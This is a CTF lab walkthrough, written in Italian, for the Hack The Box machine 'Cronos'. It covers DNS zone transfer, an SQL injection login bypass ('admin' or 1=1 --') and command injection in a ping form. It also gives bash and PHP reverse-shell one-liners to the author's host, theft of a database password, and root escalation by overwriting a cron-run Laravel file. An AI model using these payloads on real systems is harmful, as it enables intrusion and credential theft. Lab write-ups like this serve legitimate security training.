@@ -1,0 +1,330 @@
+10.10.10.13
+
+sudo masscan -p1-65535 10.10.10.13 --rate 1000 --open --banners -e tun0
+[sudo] password di daerves: 
+Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-10-23 10:07:59 GMT
+Initiating SYN Stealth Scan
+Scanning 1 hosts [65535 ports/host]
+Discovered open port 80/tcp on 10.10.10.13                                     
+Discovered open port 53/tcp on 10.10.10.13                                     
+Discovered open port 22/tcp on 10.10.10.13 
+
+
+nmap -A -p22,53,80 10.10.10.13
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-23 12:15 CEST
+Nmap scan report for 10.10.10.13
+Host is up (0.17s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
+|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
+|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
+53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.10.3-P4-Ubuntu
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   223.72 ms 10.10.16.1
+2   223.77 ms 10.10.10.13
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 26.27 seconds
+
+sulla porta 80 c'è solo la pagina "base" di apache2 
+dns on port 53?
+
+interrogo il dns server per tutti i domini associati all'indirizzo 10.10.10.13:
+
+dig -x 10.10.10.13 +all @10.10.10.13 
+
+; <<>> DiG 9.16.15-Debian <<>> -x 10.10.10.13 +all @10.10.10.13
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 16499
+;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 2
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+;; QUESTION SECTION:
+;13.10.10.10.in-addr.arpa.	IN	PTR
+
+;; ANSWER SECTION:
+13.10.10.10.in-addr.arpa. 604800 IN	PTR	ns1.cronos.htb.
+
+;; AUTHORITY SECTION:
+10.10.10.in-addr.arpa.	604800	IN	NS	ns1.cronos.htb.
+
+;; ADDITIONAL SECTION:
+ns1.cronos.htb.		604800	IN	A	10.10.10.13
+
+;; Query time: 111 msec
+;; SERVER: 10.10.10.13#53(10.10.10.13)
+;; WHEN: sab ott 23 12:37:45 CEST 2021
+;; MSG SIZE  rcvd: 111
+
+
+
+
+ns1.cronos.htb.
+
+sembra un subdomain di cronos.htb, provo ad aggiungere cronos.htb a /etc/hosts e rifare una quey per scoprire tutti i subdomain:
+
+dig axfr cronos.htb +all @10.10.10.13
+
+; <<>> DiG 9.16.15-Debian <<>> axfr cronos.htb +all @10.10.10.13
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 8952
+;; flags: qr aa ra; QUERY: 1, ANSWER: 7, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+;; QUESTION SECTION:
+;cronos.htb.			IN	AXFR
+
+;; ANSWER SECTION:
+cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
+cronos.htb.		604800	IN	NS	ns1.cronos.htb.
+cronos.htb.		604800	IN	A	10.10.10.13
+admin.cronos.htb.	604800	IN	A	10.10.10.13
+ns1.cronos.htb.		604800	IN	A	10.10.10.13
+www.cronos.htb.		604800	IN	A	10.10.10.13
+cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
+
+;; Query time: 339 msec
+;; SERVER: 10.10.10.13#53(10.10.10.13)
+;; WHEN: sab ott 23 12:44:51 CEST 2021
+;; XFR size: 7 records (messages 1, bytes 203)
+
+
+admin.cronos.htb.	604800	IN	A	10.10.10.13
+
+c'è un admin.cronos.htb che potrebbe essere utile, lo aggiungo al file /etc/hosts
+
+127.0.1.1	kali
+10.10.10.13     cronos.htb
+10.10.10.13	admin.cronos.htb
+
+e provo a navigarci tramite browser, c'è una pagina di login con advertisement
+
+provo qualche pwd di default ma non vanno:
+
+Your Login Name or Password is invalid
+
+posso provare con qualche sql injection
+
+effettivamente usando come username:
+admin' or 1=1 --
+e password una qualsiasi password (ho usato pwd)
+si riesce ad accedere
+all'interno c'è una pagina con "nettools" che permette di eseguire un ping o un TRACEROUTE
+
+POST /welcome.php HTTP/1.1
+Host: admin.cronos.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 30
+Origin: http://admin.cronos.htb
+Connection: close
+Referer: http://admin.cronos.htb/welcome.php
+Cookie: PHPSESSID=nuonjv5aur2v9hfe71tpa30im3
+Upgrade-Insecure-Requests: 1
+
+command=ping+-c+1&host=8.8.8.8
+
+se la stringa command e host vengono concatenate direttamente potrei sfruttarle per eseguire un comando (tipo reverse shell) sulla macchina
+infatti si riesce:
+
+dando nel campo ip del ping:
+
+8.8.8.8 & id
+si ottiene:
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
+
+--- 8.8.8.8 ping statistics ---
+1 packets transmitted, 0 received, 100% packet loss, time 0ms
+
+riesco ad ottenre /etc/passwd:
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/bin/bash
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+lxd:x:106:65534::/var/lib/lxd/:/bin/false
+mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
+messagebus:x:108:112::/var/run/dbus:/bin/false
+uuidd:x:109:113::/run/uuidd:/bin/false
+dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
+noulis:x:1000:1000:Noulis Panoulis,,,:/home/noulis:/bin/bash
+bind:x:112:119::/var/cache/bind:/bin/false
+
+
+(user noulis)
+provo ad ottenere una rev shell dando come indirizzo per il ping:
+
+8.8.8.8 & bash -i >& /dev/tcp/10.10.16.4/8899 0>&1
+
+in effetti visto come è strutturata la richiesta si può anche usare burp per eliminare direttamente il campo host e usare solo il campo command:
+
+
+POST /welcome.php HTTP/1.1
+Host: admin.cronos.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 30
+Origin: http://admin.cronos.htb
+Connection: close
+Referer: http://admin.cronos.htb/welcome.php
+Cookie: PHPSESSID=nuonjv5aur2v9hfe71tpa30im3
+Upgrade-Insecure-Requests: 1
+
+command=id
+
+la rev shell con bash non funziona, provo a mandare la rev shell con php one line:
+
+    php -r '$sock=fsockopen("10.10.16.4",8899);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+mandandola con burp non funzion (forse serviva url encoding?) ma usando uil campo sul sito con:
+8.8.8.8;php -r '$sock=fsockopen("10.10.16.4",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+oppure:
+8.8.8.8 & php -r '$sock=fsockopen("10.10.16.4",8899);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+si ottiene la reverse shell:
+
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+si può leggere direttamente il file /home/noulis/user.txt:
+
+51d236438b333970dbba7dc3089be33b
+
+
+www-data@cronos:/var/www/admin$ cat config.php
+cat config.php
+<?php
+   define('DB_SERVER', 'localhost');
+   define('DB_USERNAME', 'admin');
+   define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
+   define('DB_DATABASE', 'admin');
+   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
+?>
+
+
+la pwd trovata potrebbe essere utile
+ma non è la password ne per www-data ne per noulis quindi prob non c'è un riuso delle pwd
+
+sotto /var/www c'è la dir di laraveL
+
+/var/www$ ls -lart
+ls -lart
+total 20
+drwxr-xr-x 14 root     root     4096 Mar 22  2017 ..
+drwxr-xr-x  5 root     root     4096 Apr  9  2017 .
+drwxr-xr-x 13 www-data www-data 4096 Apr  9  2017 laravel
+drwxr-xr-x  2 www-data www-data 4096 Jan  1  2021 html
+drwxr-xr-x  2 www-data www-data 4096 Jan  1  2021 admin
+
+
+cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+* * * * *	root	php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
+
+possiamo vedere che laravel esegue qualcosa come root
+in /var/www/laravel/artisan troviamo:
+/*
+|--------------------------------------------------------------------------
+| Run The Artisan Application
+|--------------------------------------------------------------------------
+|
+| When we run the console application, the current CLI command will be
+| executed in this console and the response sent back to a terminal
+| or another output device for the developers. Here goes nothing!
+|
+*/
+
+$kernel = $app->make(Illuminate\Contracts\Console\Kernel::class);
+
+$status = $kernel->handle(
+    $input = new Symfony\Component\Console\Input\ArgvInput,
+    new Symfony\Component\Console\Output\ConsoleOutput
+);
+
+dalla doc di laravel:
+
+https://laravel.com/docs/5.6/scheduling#scheduling-shell-commands
+
+You may define all of your scheduled tasks in the schedule method of the App\Console\Kernel class.      --->     /var/www/laravel/app/Console/Kernel.php
+
+-rw-r--r-- 1 www-data www-data  819 Apr  9  2017 Kernel.php
+
+il comando all'interno viene eseguito come root ma il file è modificabile da www-data 
+
+ci aggiungo:
+
+$schedule->exec('cat /root/root.txt > /tmp/root_file.txt')->everyMinute();
+
+
+oppure visto che quello ad essere eseguito effettivamente è il file php /var/www/laravel/artisan
+posso anche sostituirlo direttamente con un comando che mi da rev shell
+
+echo '<?php $sock=fsockopen("10.10.16.4",9988);exec("/bin/sh -i <&3 >&3 2>&3"); ?>' > artisan
+
+
+ottenuta la rev shell ottengo anche root:
+
+1703b8a3c9a8dde879942c79d02fd3a0
